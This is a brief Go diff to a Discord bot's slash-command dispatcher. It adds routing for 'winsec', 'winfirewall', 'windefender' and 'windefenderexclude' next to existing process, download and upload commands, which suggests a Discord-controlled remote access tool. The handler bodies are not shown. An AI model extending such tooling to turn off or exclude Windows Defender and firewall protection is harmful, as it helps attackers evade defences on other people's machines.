@@ -46,6 +46,14 @@ func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			handleSlashPs(s, i)
 		case "pidinfo":
 			handleSlashPidInfo(s, i, data)
+		case "winsec":
+			handleSlashWinSec(s, i)
+		case "winfirewall":
+			handleSlashWinFirewall(s, i, data)
+		case "windefender":
+			handleSlashWinDefender(s, i, data)
+		case "windefenderexclude":
+			handleSlashWinDefenderExclude(s, i, data)
 		case "download":
 			handleSlashDownload(s, i, data)
 		case "upload":
